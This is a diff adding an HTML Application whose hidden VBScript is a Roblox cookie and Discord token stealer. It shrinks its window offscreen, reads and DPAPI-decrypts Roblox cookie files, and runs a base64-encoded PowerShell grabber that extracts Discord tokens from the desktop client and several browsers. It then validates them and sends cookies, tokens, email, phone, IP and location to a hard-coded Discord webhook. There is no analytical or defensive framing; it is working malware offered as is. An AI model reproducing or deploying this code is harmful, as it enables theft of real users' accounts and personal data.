@@ -1,0 +1,323 @@
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0:window.moveTo -2000,-2000
+On Error Resume Next
+
+Dim sh, fso, WH, PC, USER
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' === ОДИН ВЕБХУК ===
+WH = "https://discord.com/api/webhooks/1545410616955633707/lTyvG7dSoIzAWXu9UneNvmlCX-Kk4tECIbjY3cxMKynsuNoDNYOhYjjnchlwe0PK9AK8"
+PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+' === ПОЛУЧЕНИЕ РЕАЛЬНОГО IP ===
+Function GetRealIP()
+    GetRealIP = "Unknown"
+    On Error Resume Next
+    Dim h, resp
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", "https://api.ipify.org", False
+    h.Send
+    If h.Status = 200 Then GetRealIP = h.ResponseText
+    Set h = Nothing
+End Function
+
+' === ПОЛУЧЕНИЕ ГЕО (СТРАНА+ГОРОД) ===
+Function GetGeo(ip)
+    GetGeo = "Unknown / Unknown"
+    On Error Resume Next
+    If ip = "Unknown" Then Exit Function
+    Dim h, resp, country, city
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", "https://ipapi.co/" & ip & "/json/", False
+    h.Send
+    If h.Status = 200 Then
+        resp = h.ResponseText
+        Dim reg, matches
+        Set reg = New RegExp
+        reg.Pattern = """country_name""\s*:\s*""([^""]+)"""
+        reg.Global = False
+        Set matches = reg.Execute(resp)
+        If matches.Count > 0 Then country = matches(0).SubMatches(0)
+        reg.Pattern = """city""\s*:\s*""([^""]+)"""
+        Set matches = reg.Execute(resp)
+        If matches.Count > 0 Then city = matches(0).SubMatches(0)
+        If Len(city) > 0 And Len(country) > 0 Then
+            GetGeo = city & ", " & country
+        ElseIf Len(country) > 0 Then
+            GetGeo = country
+        End If
+    End If
+    Set h = Nothing
+End Function
+
+' === ГРАББЕР ROBLOX ===
+Sub GrabRoblox()
+    Dim ip, geo, ipInfo
+    ip = GetRealIP()
+    geo = GetGeo(ip)
+    If geo = "Unknown / Unknown" Then
+        ipInfo = ip
+    Else
+        ipInfo = ip & " / " & geo
+    End If
+    
+    Dim paths(4)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    Dim i, fp, raw
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+    Next
+    If Len(fp) = 0 Then
+        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim folder, subf
+            Set folder = fso.GetFolder(pk)
+            For Each subf In folder.SubFolders
+                If InStr(subf.Name, "ROBLOX") > 0 Then
+                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
+                    If fso.FileExists(uwp) Then fp = uwp: Exit For
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    End If
+    If Len(fp) = 0 Then
+        Call PostEmbed("Roblox Logger - No Cookie", "IP: " & ipInfo & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16711680)
+        Exit Sub
+    End If
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then
+        Call PostEmbed("Roblox Logger - File Too Small", "Size: " & Len(raw) & " bytes" & vbLf & "IP: " & ipInfo & vbLf & "PC: " & PC, 16711680)
+        Exit Sub
+    End If
+    
+    Dim cookie: cookie = "": Dim approach: approach = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        approach = "JSON-DPAPI"
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then
+                    cookie = DecryptDPAPI(b64)
+                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                End If
+            End If
+        End If
+    End If
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
+    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Mid(cookie, cae)
+    
+    ' === ОТПРАВКА: IP В ОПИСАНИИ, КУКА В ОТДЕЛЬНОМ ПОЛЕ EMBED ===
+    Dim embedDesc, cookieTrunc
+    embedDesc = "Method: " & approach & vbLf & "Cookie Size: " & Len(cookie) & " bytes" & vbLf & vbLf & "IP Location: " & ipInfo & vbLf & "Computer: " & PC & vbLf & "User: " & USER
+    
+    ' === ОБРЕЗАЕМ КУКУ ДЛЯ ВСТАВКИ В EMBED (МАКСИМУМ 1024 СИМВОЛА) ===
+    If Len(cookie) > 1000 Then
+        cookieTrunc = Left(cookie, 997) & "..."
+    Else
+        cookieTrunc = cookie
+    End If
+    
+    Call PostEmbedWithCookie("Roblox Cookie Logger", embedDesc, cookieTrunc, 16711680)
+End Sub
+
+' === НОВАЯ ФУНКЦИЯ: EMBED + КУКА В ПОЛЕ ===
+Sub PostEmbedWithCookie(t, d, ck, col)
+    On Error Resume Next
+    Dim j
+    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & col & ",""fields"":[{""name"":""Cookie"",""value"":""```" & Ej(ck) & "```""}],""footer"":{""text"":""Logged: " & Ej(Now()) & """}}]}"
+    Dim h
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+
+' === ОРИГИНАЛЬНЫЕ ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ) ===
+Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
+    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
+
+Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
+    If i = 0 Then Exit Sub
+    Dim r: r = True
+    Do While r
+        Set w = GetObject("winmgmts:\\.\root\cimv2")
+        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
+        Set w = Nothing
+        If r Then WScript.Sleep 150
+    Loop
+End Sub
+
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
+Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+
+Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing: End Sub
+
+Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
+Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+
+' === DISCORD GRABBER (embedded base64) ===
+DG_B64 = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwoKJFdIID0gJ2h0"
+DG_B64 = DG_B64 & "dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1NDU0MTA2MTY5NTU2MzM3MDcvbFR5"
+DG_B64 = DG_B64 & "dkc3ZFNvSVpBV1h1OVVuZU52bWxDWC1LazR0RUNJYmpZM2N4TUt5bnN1Tm9ETllPaFlqam5j"
+DG_B64 = DG_B64 & "aGx3ZTBQSzlBSzgnCiRVQSA9ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42"
+DG_B64 = DG_B64 & "NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUv"
+DG_B64 = DG_B64 & "MTI2LjAuMC4wIFNhZmFyaS81MzcuMzYnCgokcHViSVAgPSAnJwp0cnkgeyAkcHViSVAgPSAo"
+DG_B64 = DG_B64 & "SW52b2tlLVJlc3RNZXRob2QgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycgLVRpbWVvdXRTZWMg"
+DG_B64 = DG_B64 & "NSkgfSBjYXRjaCB7fQoKIyBBRVMtR0NNIENUUiBkZWNyeXB0b3IgKERpc2NvcmQgZGVza3Rv"
+DG_B64 = DG_B64 & "cCB0b2tlbiBlbmNyeXB0aW9uKQpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5TZWN1"
+DG_B64 = DG_B64 & "cml0eQp0cnkgewogICAgJGMwID0gQCcKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uU2Vj"
+DG_B64 = DG_B64 & "dXJpdHkuQ3J5cHRvZ3JhcGh5OwpwdWJsaWMgY2xhc3MgRFggewogICAgcHVibGljIHN0YXRp"
+DG_B64 = DG_B64 & "YyBieXRlW10gRChieXRlW10gaywgYnl0ZVtdIG4sIGJ5dGVbXSBjKXsKICAgICAgICB1c2lu"
+DG_B64 = DG_B64 & "Zyh2YXIgYSA9IEFlcy5DcmVhdGUoKSl7IGEuS2V5ID0gazsgYS5Nb2RlID0gQ2lwaGVyTW9k"
+DG_B64 = DG_B64 & "ZS5FQ0I7IGEuUGFkZGluZyA9IFBhZGRpbmdNb2RlLk5vbmU7CiAgICAgICAgYnl0ZVtdIG8g"
+DG_B64 = DG_B64 & "PSBuZXcgYnl0ZVtjLkxlbmd0aF07IGJ5dGVbXSB4ID0gbmV3IGJ5dGVbMTZdOyBBcnJheS5D"
+DG_B64 = DG_B64 & "b3B5KG4sIHgsIDEyKTsgeFsxNV0gPSAyOwogICAgICAgIHVzaW5nKHZhciBlID0gYS5DcmVh"
+DG_B64 = DG_B64 & "dGVFbmNyeXB0b3IoKSl7IGZvcihpbnQgaSA9IDA7IGkgPCBjLkxlbmd0aDsgaSArPSAxNil7"
+DG_B64 = DG_B64 & "CiAgICAgICAgICAgIGJ5dGVbXSBiID0gZS5UcmFuc2Zvcm1GaW5hbEJsb2NrKHgsIDAsIDE2"
+DG_B64 = DG_B64 & "KTsgaW50IG0gPSBNYXRoLk1pbigxNiwgYy5MZW5ndGggLSBpKTsKICAgICAgICAgICAgZm9y"
+DG_B64 = DG_B64 & "KGludCBqID0gMDsgaiA8IG07IGorKykgb1tpICsgal0gPSAoYnl0ZSkoY1tpICsgal0gXiBi"
+DG_B64 = DG_B64 & "W2pdKTsKICAgICAgICAgICAgZm9yKGludCBqID0gMTU7IGogPj0gMTI7IGotLSl7IGlmKCsr"
+DG_B64 = DG_B64 & "eFtqXSAhPSAwKSBicmVhazsgfSB9IH0KICAgICAgICByZXR1cm4gbzsgfSB9Cn0KJ0AKICAg"
+DG_B64 = DG_B64 & "IEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkYzAgLUxhbmd1YWdlIENTaGFycAp9IGNhdGNo"
+DG_B64 = DG_B64 & "IHt9CgokdG9rZW5zID0gQHt9CgpmdW5jdGlvbiBSZWFkLUZpbGVUZXh0KCRwYXRoKSB7CiAg"
+DG_B64 = DG_B64 & "ICAkciA9ICRudWxsCiAgICB0cnkgewogICAgICAgICRmcyA9IFtJTy5GaWxlXTo6T3Blbigk"
+DG_B64 = DG_B64 & "cGF0aCwgW0lPLkZpbGVNb2RlXTo6T3BlbiwgW0lPLkZpbGVBY2Nlc3NdOjpSZWFkLCBbSU8u"
+DG_B64 = DG_B64 & "RmlsZVNoYXJlXTo6UmVhZFdyaXRlKQogICAgICAgICRzciA9IE5ldy1PYmplY3QgSU8uU3Ry"
+DG_B64 = DG_B64 & "ZWFtUmVhZGVyKCRmcykKICAgICAgICAkciA9ICRzci5SZWFkVG9FbmQoKTsgJHNyLkNsb3Nl"
+DG_B64 = DG_B64 & "KCk7ICRmcy5DbG9zZSgpCiAgICB9IGNhdGNoIHt9CiAgICByZXR1cm4gJHIKfQoKIyAtLS0t"
+DG_B64 = DG_B64 & "IERlc2t0b3AgRGlzY29yZCBjbGllbnRzICh0b2tlbiBlbmNyeXB0ZWQgd2l0aCBkUXc0dzlX"
+DG_B64 = DG_B64 & "Z1hjUSBrZXkpIC0tLS0KJG0wID0gJG51bGwKdHJ5IHsKICAgICRwMCA9ICIkZW52OkFQUERB"
+DG_B64 = DG_B64 & "VEFcZGlzY29yZFxMb2NhbCBTdGF0ZSIKICAgICRqMCA9IEdldC1Db250ZW50ICRwMCAtUmF3"
+DG_B64 = DG_B64 & "IHwgQ29udmVydEZyb20tSnNvbgogICAgJGIwID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3Ry"
+DG_B64 = DG_B64 & "aW5nKCRqMC5vc19jcnlwdC5lbmNyeXB0ZWRfa2V5KQogICAgJG0wID0gW1NlY3VyaXR5LkNy"
+DG_B64 = DG_B64 & "eXB0b2dyYXBoeS5Qcm90ZWN0ZWREYXRhXTo6VW5wcm90ZWN0KCRiMFs1Li4oJGIwLkxlbmd0"
+DG_B64 = DG_B64 & "aCAtIDEpXSwgJG51bGwsIFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuRGF0YVByb3RlY3Rpb25T"
+DG_B64 = DG_B64 & "Y29wZV06OkN1cnJlbnRVc2VyKQp9IGNhdGNoIHt9Cgpmb3JlYWNoICgkZGlyIGluIEAoCiAg"
+DG_B64 = DG_B64 & "ICAiJGVudjpBUFBEQVRBXGRpc2NvcmRcTG9jYWwgU3RvcmFnZVxsZXZlbGRiIiwKICAgICIk"
+DG_B64 = DG_B64 & "ZW52OkFQUERBVEFcZGlzY29yZHB0YlxMb2NhbCBTdG9yYWdlXGxldmVsZGIiLAogICAgIiRl"
+DG_B64 = DG_B64 & "bnY6QVBQREFUQVxkaXNjb3JkY2FuYXJ5XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYiIKKSkgewog"
+DG_B64 = DG_B64 & "ICAgaWYgKCEoVGVzdC1QYXRoICRkaXIpKSB7IGNvbnRpbnVlIH0KICAgICRmaWxlcyA9IEdl"
+DG_B64 = DG_B64 & "dC1DaGlsZEl0ZW0gJGRpciAtRmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8"
+DG_B64 = DG_B64 & "IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW1hdGNoICdcLihsZGJ8bG9nKSQnIH0KICAgIGZv"
+DG_B64 = DG_B64 & "cmVhY2ggKCRmIGluICRmaWxlcykgewogICAgICAgICRyID0gUmVhZC1GaWxlVGV4dCAkZi5G"
+DG_B64 = DG_B64 & "dWxsTmFtZQogICAgICAgIGlmICghJHIgLW9yICEkbTApIHsgY29udGludWUgfQogICAgICAg"
+DG_B64 = DG_B64 & "IGZvcmVhY2ggKCRtIGluIFtyZWdleF06Ok1hdGNoZXMoJHIsICdkUXc0dzlXZ1hjUTooW0Et"
+DG_B64 = DG_B64 & "WmEtejAtOSsvPV17NDAsMzAwfSknKSkgewogICAgICAgICAgICAkYjY0ID0gJG0uR3JvdXBz"
+DG_B64 = DG_B64 & "WzFdLlZhbHVlCiAgICAgICAgICAgIHdoaWxlICgkYjY0Lkxlbmd0aCAlIDQgLW5lIDApIHsg"
+DG_B64 = DG_B64 & "JGI2NCArPSAnPScgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJGUgPSBb"
+DG_B64 = DG_B64 & "Q29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGI2NCkKICAgICAgICAgICAgICAgIGlmICgk"
+DG_B64 = DG_B64 & "ZS5MZW5ndGggLWx0IDgwKSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICR0ayA9IFtU"
+DG_B64 = DG_B64 & "ZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0RYXTo6RCgkbTAsICRlWzMuLjE0XSwg"
+DG_B64 = DG_B64 & "JGVbMTUuLigkZS5MZW5ndGggLSAxNyldKSkuVHJpbUVuZChbY2hhcl0wKQogICAgICAgICAg"
+DG_B64 = DG_B64 & "ICAgICAgaWYgKCR0ay5MZW5ndGggLWd0IDQwIC1hbmQgISR0b2tlbnMuQ29udGFpbnNLZXko"
+DG_B64 = DG_B64 & "JHRrKSkgeyAkdG9rZW5zWyR0a10gPSAkdHJ1ZSB9CiAgICAgICAgICAgIH0gY2F0Y2gge30K"
+DG_B64 = DG_B64 & "ICAgICAgICB9CiAgICB9Cn0KCiMgLS0tLSBCcm93c2VycyAod2ViIHRva2VucyBhcmUgUExB"
+DG_B64 = DG_B64 & "SU5URVhUIGluIGxvY2FsU3RvcmFnZSBsZXZlbGRiLCBVVEYtMTZMRSkgLS0tLQpmb3JlYWNo"
+DG_B64 = DG_B64 & "ICgkYnIgaW4gQCgKICAgICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIg"
+DG_B64 = DG_B64 & "RGF0YSIsCiAgICAiJGVudjpMT0NBTEFQUERBVEFcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRh"
+DG_B64 = DG_B64 & "IiwKICAgICIkZW52OkxPQ0FMQVBQREFUQVxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJc"
+DG_B64 = DG_B64 & "VXNlciBEYXRhIiwKICAgICIkZW52OkFQUERBVEFcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3Rh"
+DG_B64 = DG_B64 & "YmxlIiwKICAgICIkZW52OkFQUERBVEFcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl"
+DG_B64 = DG_B64 & "IiwKICAgICIkZW52OkxPQ0FMQVBQREFUQVxWaXZhbGRpXFVzZXIgRGF0YSIKKSkgewogICAg"
+DG_B64 = DG_B64 & "aWYgKCEoVGVzdC1QYXRoICRicikpIHsgY29udGludWUgfQogICAgJHByb2ZzID0gR2V0LUNo"
+DG_B64 = DG_B64 & "aWxkSXRlbSAkYnIgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8"
+DG_B64 = DG_B64 & "IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWVxICdEZWZhdWx0JyAtb3IgJF8uTmFtZSAtbWF0"
+DG_B64 = DG_B64 & "Y2ggJ15Qcm9maWxlJyB9CiAgICBmb3JlYWNoICgkcCBpbiAkcHJvZnMpIHsKICAgICAgICAk"
+DG_B64 = DG_B64 & "bHNkID0gSm9pbi1QYXRoICRwLkZ1bGxOYW1lICdMb2NhbCBTdG9yYWdlXGxldmVsZGInCiAg"
+DG_B64 = DG_B64 & "ICAgICAgaWYgKCEoVGVzdC1QYXRoICRsc2QpKSB7IGNvbnRpbnVlIH0KICAgICAgICAkZmls"
+DG_B64 = DG_B64 & "ZXMgPSBHZXQtQ2hpbGRJdGVtICRsc2QgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u"
+DG_B64 = DG_B64 & "dGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1tYXRjaCAnXC4obGRifGxvZykkJyB9"
+DG_B64 = DG_B64 & "CiAgICAgICAgZm9yZWFjaCAoJGYgaW4gJGZpbGVzKSB7CiAgICAgICAgICAgICRyID0gUmVh"
+DG_B64 = DG_B64 & "ZC1GaWxlVGV4dCAkZi5GdWxsTmFtZQogICAgICAgICAgICBpZiAoISRyKSB7IGNvbnRpbnVl"
+DG_B64 = DG_B64 & "IH0KICAgICAgICAgICAgIyBTdHJpcCBudWxsIGJ5dGVzIChDaHJvbWl1bSBsb2NhbFN0b3Jh"
+DG_B64 = DG_B64 & "Z2UgdmFsdWVzIGFyZSBVVEYtMTZMRSAtPiB0b2tlbiBjaGFycyBzcGxpdCBieSBceDAwKQog"
+DG_B64 = DG_B64 & "ICAgICAgICAgICAkciA9ICRyIC1yZXBsYWNlICJceDAwIiwgIiIKICAgICAgICAgICAgZm9y"
+DG_B64 = DG_B64 & "ZWFjaCAoJG0gaW4gW3JlZ2V4XTo6TWF0Y2hlcygkciwgJ1tBLVphLXowLTlfLV17MjR9XC5b"
+DG_B64 = DG_B64 & "QS1aYS16MC05Xy1dezZ9XC5bQS1aYS16MC05Xy1dezI3LDExMH0nKSkgewogICAgICAgICAg"
+DG_B64 = DG_B64 & "ICAgICAgJHRrID0gJG0uVmFsdWUKICAgICAgICAgICAgICAgIGlmICghJHRva2Vucy5Db250"
+DG_B64 = DG_B64 & "YWluc0tleSgkdGspKSB7ICR0b2tlbnNbJHRrXSA9ICR0cnVlIH0KICAgICAgICAgICAgfQog"
+DG_B64 = DG_B64 & "ICAgICAgICAgICBmb3JlYWNoICgkbSBpbiBbcmVnZXhdOjpNYXRjaGVzKCRyLCAnbWZhXC5b"
+DG_B64 = DG_B64 & "QS1aYS16MC05Xy1dezg0fScpKSB7CiAgICAgICAgICAgICAgICAkdGsgPSAkbS5WYWx1ZQog"
+DG_B64 = DG_B64 & "ICAgICAgICAgICAgICAgaWYgKCEkdG9rZW5zLkNvbnRhaW5zS2V5KCR0aykpIHsgJHRva2Vu"
+DG_B64 = DG_B64 & "c1skdGtdID0gJHRydWUgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgokcmF3"
+DG_B64 = DG_B64 & "Q291bnQgPSAkdG9rZW5zLkNvdW50CgojIC0tLS0gVmFsaWRhdGUgZWFjaCBjYW5kaWRhdGUg"
+DG_B64 = DG_B64 & "YWdhaW5zdCBEaXNjb3JkIEFQSSAtLS0tCiR2YWxpZCA9IEAoKQpmb3JlYWNoICgkdGsgaW4g"
+DG_B64 = DG_B64 & "JHRva2Vucy5LZXlzKSB7CiAgICB0cnkgewogICAgICAgICRtZSA9IEludm9rZS1SZXN0TWV0"
+DG_B64 = DG_B64 & "aG9kICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUnIC1IZWFkZXJzIEB7"
+DG_B64 = DG_B64 & "IEF1dGhvcml6YXRpb24gPSAkdGs7ICdVc2VyLUFnZW50JyA9ICRVQSB9IC1UaW1lb3V0U2Vj"
+DG_B64 = DG_B64 & "IDYKICAgICAgICBpZiAoJG1lLnVzZXJuYW1lKSB7ICR2YWxpZCArPSBbcHNjdXN0b21vYmpl"
+DG_B64 = DG_B64 & "Y3RdQHsgVG9rZW4gPSAkdGs7IE1lID0gJG1lIH0gfQogICAgfSBjYXRjaCB7fQp9CgojIC0t"
+DG_B64 = DG_B64 & "LS0gUmVwb3J0IHRvIHdlYmhvb2sgLS0tLQpmdW5jdGlvbiBQb3N0LUVtYmVkKCR0aXRsZSwg"
+DG_B64 = DG_B64 & "JGRlc2MsICRjb2xvciwgJHRva2VuRmllbGQpIHsKICAgICRmdCA9ICIkZW52OkNPTVBVVEVS"
+DG_B64 = DG_B64 & "TkFNRSB8ICRlbnY6VVNFUk5BTUUiCiAgICBpZiAoJHB1YklQKSB7ICRmdCArPSAiIHwgJHB1"
+DG_B64 = DG_B64 & "YklQIiB9CiAgICAkZW1iZWQgPSBAeyB0aXRsZSA9ICR0aXRsZTsgZGVzY3JpcHRpb24gPSAk"
+DG_B64 = DG_B64 & "ZGVzYzsgY29sb3IgPSAkY29sb3I7IGZvb3RlciA9IEB7IHRleHQgPSAkZnQgfSB9CiAgICBp"
+DG_B64 = DG_B64 & "ZiAoJHRva2VuRmllbGQpIHsgJGVtYmVkWydmaWVsZHMnXSA9IEAoQHsgbmFtZSA9ICdUb2tl"
+DG_B64 = DG_B64 & "bic7IHZhbHVlID0gJHRva2VuRmllbGQgfSkgfQogICAgJGJvZHkgPSBAeyBlbWJlZHMgPSBA"
+DG_B64 = DG_B64 & "KCRlbWJlZCkgfSB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCA2CiAgICB0cnkgeyBJbnZva2Ut"
+DG_B64 = DG_B64 & "UmVzdE1ldGhvZCAkV0ggLU1ldGhvZCBQb3N0IC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24v"
+DG_B64 = DG_B64 & "anNvbicgLUhlYWRlcnMgQHsgJ1VzZXItQWdlbnQnID0gJFVBIH0gLUJvZHkgJGJvZHkgfSBj"
+DG_B64 = DG_B64 & "YXRjaCB7fQp9CgppZiAoJHZhbGlkLkNvdW50IC1lcSAwKSB7CiAgICAkZCA9ICJObyB2YWxp"
+DG_B64 = DG_B64 & "ZCBEaXNjb3JkIHRva2VucyBmb3VuZCBvbiB0aGlzIG1hY2hpbmUuYG5gblJhdyBjYW5kaWRh"
+DG_B64 = DG_B64 & "dGVzIHNjYW5uZWQ6ICRyYXdDb3VudCIKICAgIFBvc3QtRW1iZWQgJ0Rpc2NvcmQgVG9rZW4g"
+DG_B64 = DG_B64 & "LSBOb3QgRm91bmQnICRkIDE2NzExNjgwICRudWxsCn0gZWxzZSB7CiAgICBmb3JlYWNoICgk"
+DG_B64 = DG_B64 & "diBpbiAkdmFsaWQpIHsKICAgICAgICAkbWUgPSAkdi5NZQogICAgICAgICRkID0gIioqVXNl"
+DG_B64 = DG_B64 & "cjoqKiAkKCRtZS51c2VybmFtZSkiCiAgICAgICAgaWYgKCRtZS5lbWFpbCkgeyAkZCArPSAi"
+DG_B64 = DG_B64 & "YG4qKkVtYWlsOioqICQoJG1lLmVtYWlsKSIgfQogICAgICAgIGlmICgkbWUucGhvbmUpIHsg"
+DG_B64 = DG_B64 & "JGQgKz0gImBuKipQaG9uZToqKiAkKCRtZS5waG9uZSkiIH0KICAgICAgICBpZiAoJG1lLmlk"
+DG_B64 = DG_B64 & "KSB7ICRkICs9ICJgbioqSUQ6KiogJCgkbWUuaWQpIiB9CiAgICAgICAgaWYgKCRtZS5tZmFf"
+DG_B64 = DG_B64 & "ZW5hYmxlZCkgeyAkZCArPSAiYG4qKjJGQToqKiBFbmFibGVkIiB9CiAgICAgICAgJGNiID0g"
+DG_B64 = DG_B64 & "J2BgYCcgKyAkdi5Ub2tlbiArICdgYGAnCiAgICAgICAgUG9zdC1FbWJlZCAnRGlzY29yZCBU"
+DG_B64 = DG_B64 & "b2tlbicgJGQgMTY3MTE2ODAgJGNiCiAgICB9Cn0K"
+
+' === GRABBER DISCORD ===
+Sub GrabDiscord()
+    On Error Resume Next
+    Dim b64file: b64file = TmpFile("dg.b64")
+    WriteFile b64file, DG_B64
+    Dim psfile: psfile = TmpFile("dg.ps1")
+    fso.DeleteFile psfile, True
+    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -Command ""[IO.File]::WriteAllBytes('" & psfile & "',[Convert]::FromBase64String((Get-Content '" & b64file & "' -Raw).Trim()))"""
+    If fso.FileExists(psfile) Then
+        RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psfile & """"
+    End If
+    fso.DeleteFile b64file, True
+    fso.DeleteFile psfile, True
+End Sub
+
+' === MAIN ===
+Call GrabRoblox
+Call GrabDiscord
+window.close()
+
+</script>
+</head>
+<body></body>
+</html>
